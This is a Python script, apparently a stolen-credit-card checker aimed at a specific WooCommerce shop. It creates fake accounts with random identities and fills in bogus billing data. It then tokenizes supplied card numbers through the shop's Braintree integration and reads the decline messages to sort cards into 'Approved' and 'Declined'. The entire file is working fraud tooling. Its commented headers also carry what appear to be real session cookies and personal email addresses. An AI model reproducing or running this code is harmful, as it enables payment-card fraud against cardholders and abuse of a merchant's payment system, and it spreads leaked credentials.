import random
import re
import names
from requests import Session
from dataclasses import dataclass
import uuid
import base64
import requests
import json
import names
from bs4 import BeautifulSoup
import uuid

def paserX(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None 

@dataclass
class brainrrrt:
    def main(self, card):
        try:
            self.card = card
            self.ccs = card.split('|')
            if self.ccs[0].startswith("4"): self.brand = "VI"
            if self.ccs[0].startswith("3"): self.brand = "AE"
            elif self.ccs[0].startswith("5"): self.brand = "MC"
            def generar_correo():
                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            CorreoRand = generar_correo()

            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
            self.session = Session()
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://www.velocityap.com/my-account/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; mailchimp.cart.current_email=leandrojulio1324@gmail.com; mailchimp.cart.previous_email=leandrojulio1324@gmail.com; mailchimp_user_email=leandrojulio1324%40gmail.com; sbjs_session=pgs%3D34%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.velocityap.com%2Fmy-account%2F',
            }

            response = self.session.get('https://www.velocityap.com/my-account/', headers=headers).text
            register3 = paserX(response, 'name="woocommerce-register-nonce" value="', '"')
            print(register3)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.velocityap.com',
                'priority': 'u=0, i',
                'referer': 'https://www.velocityap.com/my-account/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; mailchimp.cart.current_email=leandrojulio1324@gmail.com; mailchimp.cart.previous_email=leandrojulio1324@gmail.com; mailchimp_user_email=leandrojulio1324%40gmail.com; sbjs_session=pgs%3D35%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.velocityap.com%2Fmy-account%2F',
            }

            data = [
                ('username', username),
                ('email', CorreoRand),
                ('password', 'leito132asd'),
                ('wpae_initiator', ''),
                ('alt_s', ''),
                ('udtqic3271', '533956'),
                ('mailchimp_woocommerce_newsletter', '1'),
                ('wc_order_attribution_source_type', 'typein'),
                ('wc_order_attribution_referrer', '(none)'),
                ('wc_order_attribution_utm_campaign', '(none)'),
                ('wc_order_attribution_utm_source', '(direct)'),
                ('wc_order_attribution_utm_medium', '(none)'),
                ('wc_order_attribution_utm_content', '(none)'),
                ('wc_order_attribution_utm_id', '(none)'),
                ('wc_order_attribution_utm_term', '(none)'),
                ('wc_order_attribution_utm_source_platform', '(none)'),
                ('wc_order_attribution_utm_creative_format', '(none)'),
                ('wc_order_attribution_utm_marketing_tactic', '(none)'),
                ('wc_order_attribution_session_entry', 'https://www.velocityap.com/'),
                ('wc_order_attribution_session_start_time', '2026-04-13 19:58:49'),
                ('wc_order_attribution_session_pages', '35'),
                ('wc_order_attribution_session_count', '1'),
                ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'),
                ('woocommerce-register-nonce', register3),
                ('_wp_http_referer', '/my-account/'),
                ('register', 'Register'),
                ('alt_s', ''),
                ('udtqic3271', '533956'),
            ]

            response = self.session.post('https://www.velocityap.com/my-account/',  headers=headers, data=data)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'priority': 'u=0, i',
                'referer': 'https://www.velocityap.com/my-account/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; mailchimp.cart.current_email=leandrojulio1324@gmail.com; mailchimp.cart.previous_email=leandrojulio1324@gmail.com; mailchimp_user_email=leandrojulio1324%40gmail.com; wordpress_logged_in_2135d9a394e0de1a3ce0814136810cb0=kokeli5032%40dubokutv.com%7C1777324086%7Cy9FlUIik5DQQrl5ZFmSmVmoFcmBvftGKocZ5hRY0Emw%7C2f25ade9ff52424ed66709ef90f970d58c542421398d7ce053022c1c3a331b82; wfwaf-authcookie-65026ee2271c5bba5454957f0f9f48fc=91001%7Cother%7Cread%7C2782b7a403e930e2df3975f1244ab01bc6b940d2e1071cda5b4825085981d751; sbjs_session=pgs%3D51%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.velocityap.com%2Fmy-account%2F',
            }

            response = self.session.get('https://www.velocityap.com/my-account/edit-address/', headers=headers)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'priority': 'u=0, i',
                'referer': 'https://www.velocityap.com/my-account/edit-address/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; mailchimp.cart.current_email=leandrojulio1324@gmail.com; mailchimp.cart.previous_email=leandrojulio1324@gmail.com; mailchimp_user_email=leandrojulio1324%40gmail.com; wordpress_logged_in_2135d9a394e0de1a3ce0814136810cb0=kokeli5032%40dubokutv.com%7C1777324086%7Cy9FlUIik5DQQrl5ZFmSmVmoFcmBvftGKocZ5hRY0Emw%7C2f25ade9ff52424ed66709ef90f970d58c542421398d7ce053022c1c3a331b82; wfwaf-authcookie-65026ee2271c5bba5454957f0f9f48fc=91001%7Cother%7Cread%7C2782b7a403e930e2df3975f1244ab01bc6b940d2e1071cda5b4825085981d751; sbjs_session=pgs%3D52%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.velocityap.com%2Fmy-account%2Fedit-address%2F',
            }

            response = self.session.get('https://www.velocityap.com/my-account/edit-address/billing/',headers=headers).text
            adresss = paserX(response, 'name="woocommerce-edit-address-nonce" value="', '"')
            print(adresss)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.velocityap.com',
                'priority': 'u=0, i',
                'referer': 'https://www.velocityap.com/my-account/edit-address/billing/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; mailchimp.cart.current_email=leandrojulio1324@gmail.com; mailchimp.cart.previous_email=leandrojulio1324@gmail.com; mailchimp_user_email=leandrojulio1324%40gmail.com; wordpress_logged_in_2135d9a394e0de1a3ce0814136810cb0=kokeli5032%40dubokutv.com%7C1777324086%7Cy9FlUIik5DQQrl5ZFmSmVmoFcmBvftGKocZ5hRY0Emw%7C2f25ade9ff52424ed66709ef90f970d58c542421398d7ce053022c1c3a331b82; wfwaf-authcookie-65026ee2271c5bba5454957f0f9f48fc=91001%7Cother%7Cread%7C2782b7a403e930e2df3975f1244ab01bc6b940d2e1071cda5b4825085981d751; sbjs_session=pgs%3D53%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.velocityap.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
            }

            data = {
                'billing_first_name': 'ldfl',
                'billing_last_name': 'dsdasd',
                'billing_company': 'ggd',
                'billing_country': 'US',
                'billing_address_1': 'moall del sol',
                'billing_address_2': 'sadw',
                'billing_city': 'guayas',
                'billing_state': 'NY',
                'billing_postcode': '10080',
                'billing_phone': '+10989861371',
                'billing_email': CorreoRand,
                'save_address': 'Save address',
                'woocommerce-edit-address-nonce': adresss,
                '_wp_http_referer': '/my-account/edit-address/billing/',
                'action': 'edit_address',
            }

            response = self.session.post(
                'https://www.velocityap.com/my-account/edit-address/billing/',

                headers=headers,
                data=data,
            )
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'priority': 'u=0, i',
                'referer': 'https://www.velocityap.com/my-account/payment-methods/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; mailchimp.cart.current_email=leandrojulio1324@gmail.com; mailchimp.cart.previous_email=leandrojulio1324@gmail.com; mailchimp_user_email=leandrojulio1324%40gmail.com; wordpress_logged_in_2135d9a394e0de1a3ce0814136810cb0=tiloperrr%7C1777322194%7CqMNfIJMANCRwefUDeeXsSOHx5eGgj3mBARldcHtDZ24%7C154d76826480d53a1da12919a7bb6910f218655b226f6babb4a423bd94200bbe; wfwaf-authcookie-65026ee2271c5bba5454957f0f9f48fc=90988%7Cother%7Cread%7C735a8682b85b840999effdb9ee80631a80391c891e4dc4e6ee2a5c16d1cca0f7; sbjs_session=pgs%3D37%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.velocityap.com%2Fmy-account%2Fpayment-methods%2F',
            }

            response = self.session.get('https://www.velocityap.com/my-account/add-payment-method/', headers=headers).text
            addpay = paserX(response, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            eyj2 = paserX(response, 'var wc_braintree_client_token = ["', '"];')
            decode = base64.b64decode(eyj2)
            decode_string = decode.decode("utf-8")

            json_data = json.loads(decode_string)   

            bearer = json_data.get('authorizationFingerprint')

            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.7',
                'authorization': f'Bearer {bearer}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'priority': 'u=1, i',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            }

            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'dropin2',
                    'sessionId': str(uuid.uuid4()),
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': self.ccs[0],
                            'expirationMonth': self.ccs[1],
                            'expirationYear': self.ccs[2],
                            'cvv': self.ccs[3],
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            response = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
            token = response['data']['tokenizeCreditCard']['token']


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.velocityap.com',
                'priority': 'u=0, i',
                'referer': 'https://www.velocityap.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-13%2019%3A58%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.velocityap.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; mailchimp.cart.current_email=leandrojulio1324@gmail.com; mailchimp.cart.previous_email=leandrojulio1324@gmail.com; mailchimp_user_email=leandrojulio1324%40gmail.com; wordpress_logged_in_2135d9a394e0de1a3ce0814136810cb0=tiloperrr%7C1777322194%7CqMNfIJMANCRwefUDeeXsSOHx5eGgj3mBARldcHtDZ24%7C154d76826480d53a1da12919a7bb6910f218655b226f6babb4a423bd94200bbe; wfwaf-authcookie-65026ee2271c5bba5454957f0f9f48fc=90988%7Cother%7Cread%7C735a8682b85b840999effdb9ee80631a80391c891e4dc4e6ee2a5c16d1cca0f7; sbjs_session=pgs%3D38%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.velocityap.com%2Fmy-account%2Fadd-payment-method%2F',
            }

            data = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': token,
                'braintree_cc_device_data': '',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': '',
                'woocommerce-add-payment-method-nonce': addpay,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }

            response = self.session.post('https://www.velocityap.com/my-account/add-payment-method/',  headers=headers, data=data).text
            err = BeautifulSoup(response, 'html.parser').find('ul', {'class':'woocommerce-error'}).text.lstrip()         
            print(err)


            if 'Card Issuer Declined CVV' in err: return 'Approved! ✅', err
            elif 'Insufficient Funds' in err: return 'Approved! ✅', err
            elif 'CVV.' in err: return 'Approved! ✅', err
            else: return 'Declined ❌', err
        except: return 
        